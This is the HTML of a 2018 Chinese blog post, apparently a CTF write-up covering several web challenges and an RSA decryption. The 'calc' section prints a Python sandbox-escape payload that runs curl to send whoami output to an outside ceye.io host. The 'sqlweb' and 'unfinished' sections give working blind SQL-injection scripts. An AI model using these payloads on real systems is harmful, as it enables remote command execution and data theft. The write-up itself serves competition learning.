@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="WEBcalc计算器功能，其中有正则显示。随手测试发现网站后端是用python写的。尝试在计算器功能中执行命令，发现无法回显。然后尝试DNS带出数据成功11+1+().__class__.__bases__[0].__subclasses__()[59].__enter__.__func__.__getattribute__(&apos;__global&apos; + &apos;s__&apos;)[&apos;s&apos;+&apos;ys&apos;].module">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WDB.2">
+<meta property="og:url" content="http://altmanz.cn/2018/08/22/WDB-2/index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="WEBcalc计算器功能，其中有正则显示。随手测试发现网站后端是用python写的。尝试在计算器功能中执行命令，发现无法回显。然后尝试DNS带出数据成功11+1+().__class__.__bases__[0].__subclasses__()[59].__enter__.__func__.__getattribute__(&apos;__global&apos; + &apos;s__&apos;)[&apos;s&apos;+&apos;ys&apos;].module">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-08-22T08:40:40.860Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WDB.2">
+<meta name="twitter:description" content="WEBcalc计算器功能，其中有正则显示。随手测试发现网站后端是用python写的。尝试在计算器功能中执行命令，发现无法回显。然后尝试DNS带出数据成功11+1+().__class__.__bases__[0].__subclasses__()[59].__enter__.__func__.__getattribute__(&apos;__global&apos; + &apos;s__&apos;)[&apos;s&apos;+&apos;ys&apos;].module">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://altmanz.cn/2018/08/22/WDB-2/"/>
+
+
+
+
+
+  <title>WDB.2 | Altm4nz</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Altm4nz</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/08/22/WDB-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Altm4nz">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/IMG_4178.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Altm4nz">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WDB.2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-22T16:09:42+08:00">
+                2018-08-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>计算器功能，其中有正则显示。<br>随手测试发现网站后端是用python写的。<br>尝试在计算器功能中执行命令，发现无法回显。<br>然后尝试DNS带出数据成功<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span>+().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__enter__.__func__.__getattribute__(<span class="string">'__global'</span> + <span class="string">'s__'</span>)[<span class="string">'s'</span>+<span class="string">'ys'</span>].modules[<span class="string">'o'</span>+<span class="string">'s'</span>].__getattribute__(<span class="string">'sy'</span> + <span class="string">'stem'</span>)(<span class="string">"curl ghljcn.ceye.io/`whoami | base64`"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>然后查找 ‘find / -name flag’<br>读flag ‘cat /flag’</p>
+<h3 id="wafupload"><a href="#wafupload" class="headerlink" title="wafupload"></a>wafupload</h3><p>代码审计，考点比较老了，之前在pwnhub的公开赛上出现过，就不详细解释了，关键点在php的对数组的end函数和count()-1对比产生的的差异，可以导致任意文件上传</p>
+<p>然后在根目录下翻到flag，直接cat读即<br>参考<a href="https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html" target="_blank" rel="noopener">https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html</a></p>
+<h3 id="sqlweb"><a href="#sqlweb" class="headerlink" title="sqlweb"></a>sqlweb</h3><p>弱密码admin admin123登陆成功，然后提示给了表明列名<br>删除cookie重新登录，发现了黑名单，但是没有过滤小于号，尝试注入，单引号闭合成功。<br>payload：wuyanzu’/**/&amp;&amp;passwd&lt;’%s’#<br>直接贴上脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#Author:Sublime</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">'http://7c9f5cab07ae428daedba75e55df7f9ed9d32408d5754c2f.game.ichunqiu.com/sql.php'</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'uname'</span>:<span class="string">''</span>,</span><br><span class="line">	<span class="string">'passwd'</span>:<span class="string">'admin123'</span>,</span><br><span class="line">	<span class="string">'submit'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">"""wuyanzu'/**/&amp;&amp;passwd&lt;'%s'#"""</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="comment"># for x in range(1,100):</span></span><br><span class="line"><span class="comment"># 	for y in range(30,127):</span></span><br><span class="line"><span class="comment"># 		print y</span></span><br><span class="line"><span class="comment"># 		payload1 = payload%(flag+chr(y))</span></span><br><span class="line"><span class="comment"># 		data['uname'] = payload1</span></span><br><span class="line"><span class="comment"># 		f = req.post(url,data)</span></span><br><span class="line"><span class="comment"># 		if 'passwd error' in f.content:</span></span><br><span class="line"><span class="comment"># 			flag += chr(y-1)</span></span><br><span class="line"><span class="comment"># 			print flag</span></span><br><span class="line"><span class="comment"># 			break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'FLAG&#123;1BDE8B12-D7C6-4E53-BBC1-5BA1F7A8CCE4&#125;'</span>.lower()</span><br></pre></td></tr></table></figure></p>
+<h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>这是一个二次注入，发现注册页面后尝试注册 altman’ or 1=1#<br>登陆后发现用户名为 1 ，应该是bool盲注<br>题目过滤了很关键的逗号和information<br>我们只能用join绕过,最后写得脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#Author:Sublime</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">url = <span class="string">'http://6e38e15412a349e2bc0d3a7c28f23457be8f9872113449bc.game.ichunqiu.com/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(email,payload)</span>:</span></span><br><span class="line">	data = &#123;</span><br><span class="line">	<span class="string">'email'</span>:email,</span><br><span class="line">	<span class="string">'username'</span>:payload,</span><br><span class="line">	<span class="string">'password'</span>:<span class="string">'aaa'</span></span><br><span class="line">	&#125;</span><br><span class="line">	cookie = &#123;</span><br><span class="line">	<span class="string">'PHPSESSID'</span>:<span class="string">'sba5or9h0mgsh2lr7boe8knji7'</span></span><br><span class="line">	&#125;</span><br><span class="line">	f = req.post(url+<span class="string">'register.php'</span>,data=data,cookies=cookie,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">	<span class="comment"># print f.content</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">	data1 = &#123;</span><br><span class="line">	<span class="string">'email'</span>:email,</span><br><span class="line">	<span class="string">'password'</span>:<span class="string">'aaa'</span></span><br><span class="line">	&#125;</span><br><span class="line">	cookie = &#123;</span><br><span class="line">	<span class="string">'PHPSESSID'</span>:<span class="string">'sba5or9h0mgsh2lr7boe8knji7'</span></span><br><span class="line">	&#125;</span><br><span class="line">	f = req.post(url+<span class="string">'login.php'</span>,data=data1,cookies=cookie)</span><br><span class="line">	<span class="comment"># print f.content</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">"""&lt;span class="user-name"&gt;</span></span><br><span class="line"><span class="string">            -1          &lt;/span&gt;"""</span> <span class="keyword">in</span> f.content:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> y <span class="keyword">in</span> string.printable:</span><br><span class="line">		payload = <span class="string">"admin'-(ascii(mid(reverse(mid((select * from (select i.1 from (select * from (select 1)a union select * from flag)i limit 1 offset 1)y limit 1)from(-"</span>+str(x)+<span class="string">")))from(-1)))="</span>+str(ord(y))+<span class="string">")-'"</span></span><br><span class="line">		email = str(int(random.randint(<span class="number">1</span>,<span class="number">99999</span>)))+<span class="string">'@xjb.com'</span></span><br><span class="line">		<span class="comment"># print email</span></span><br><span class="line">		reg(email,payload)</span><br><span class="line">		a = login(email)</span><br><span class="line">		<span class="keyword">if</span> a==<span class="number">1</span>:</span><br><span class="line">			flag += y</span><br><span class="line">			<span class="keyword">print</span> flag</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>常规的RSA解密<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">enc=<span class="string">"ICCHhzayltixzeuA++PPbDwlialEjQuDBx38ecgQwl5lOTnemrcWYbDeQkIIE5oPQOcSmNX8nmcDgyl4O05jYD7VmDcgwQTIgHeOLovcqGVPHEW4hHSmIR3BB/CBjb3/5+HfeifXF1w+/o148o76D9NtTBYaLk8CTjOscT23PBI8w+WPhHBIPaSbJlDuaHA4Ie6ojsE6mM7cp79dz7bCdAf5a2tUGA6AbNCuP1WVnsBI+IIHX8EDELmBnQ5c13JuYnjHL5lmqL3QK88QwQQ4h/3vUODAWBuzn8meWBgfpqxmHTGJ+du2mRoUTpUBzZy2OxrKdD8J11Hc+yJJJkQe5QgqACbM00K0rTv7kIyB2aB/gUGLNP4IOwV09avUpzLS2PPLgeAVP/JSGYlXZTthy4FlqL5pMN4/+swNnEN6Z+lPzLNe0JB0uNN/yPJ3C3lsSuoFLh0InYI46Tycs8vz1nHQWjQdE6hpD/HpyCbjoC2BE4ugCJKUtmp7mbyDxkjkn5ZkHhrJXK/DF4NQgYmfkZxyLOWsI2UC1niq5qGD3SIspW8NcupyGakYVzD1R9PP8xoxpkjX62f7myXLMmacbJgYe7ExeWdYXMZd76Tnqu9IJJwEO43LZz+w2rqH8DIlhr64JenxaDcIixqFzKmkk6WK71VVT3t788ZxaNhG2yo="</span></span><br><span class="line">c=int(enc.decode(<span class="string">'base64'</span>).encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">n = <span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = <span class="number">171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289</span></span><br><span class="line"></span><br><span class="line">m =hex(pow(c,d,n))[<span class="number">2</span>:].rstrip(<span class="string">'L'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'0'</span>+m).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>flag{w3lC0M3_t0_rS4_w0RlD}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/23/RSA-STUDY/" rel="next" title="RSA-STUDY">
+                <i class="fa fa-chevron-left"></i> RSA-STUDY
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/IMG_4178.JPG"
+                alt="Altm4nz" />
+            
+              <p class="site-author-name" itemprop="name">Altm4nz</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:872801413@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#calc"><span class="nav-number">1.1.</span> <span class="nav-text">calc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wafupload"><span class="nav-number">1.2.</span> <span class="nav-text">wafupload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlweb"><span class="nav-number">1.3.</span> <span class="nav-text">sqlweb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unfinished"><span class="nav-number">1.4.</span> <span class="nav-text">unfinished</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">2.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RSA"><span class="nav-number">2.1.</span> <span class="nav-text">RSA</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Altm4nz</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
